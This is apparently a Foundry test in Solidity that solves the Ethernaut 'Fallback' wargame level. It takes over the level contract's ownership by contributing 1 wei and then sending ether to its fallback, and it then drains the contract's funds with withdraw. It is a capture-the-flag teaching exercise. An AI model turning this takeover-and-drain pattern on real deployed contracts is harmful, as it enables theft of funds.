// // SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/levels/01-Fallback/FallbackFactory.sol";
import "../src/core/Ethernaut.sol";

contract FallbackTest is Test {
    // Vm vm = Vm(address(HEVM_ADDRESS));
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        // Sets an address' balance, (who, newBalance)
        vm.deal(attacker, 1 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Contribute one time to satisfy ownership change condition
        ethernautFallback.contribute{value: 1 wei}();

        emit log_named_uint(
            "Verify contribution state change: ",
            ethernautFallback.getContribution()
        );

        // Send Ether to the contract which triggers the `fallback()` function
        payable(address(ethernautFallback)).call{value: 1 wei}("");
        assertEq(ethernautFallback.owner(), attacker);

        emit log_named_uint(
            "Contract balance (before): ",
            address(ethernautFallback).balance
        );

        emit log_named_uint("Attacker balance (before): ", attacker.balance);

        ethernautFallback.withdraw(); // Empty smart contract funds
        assertEq(address(ethernautFallback).balance, 0);

        emit log_named_uint(
            "Contract balance (after): ",
            address(ethernautFallback).balance
        );

        emit log_named_uint("Attacker balance (after): ", attacker.balance);
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
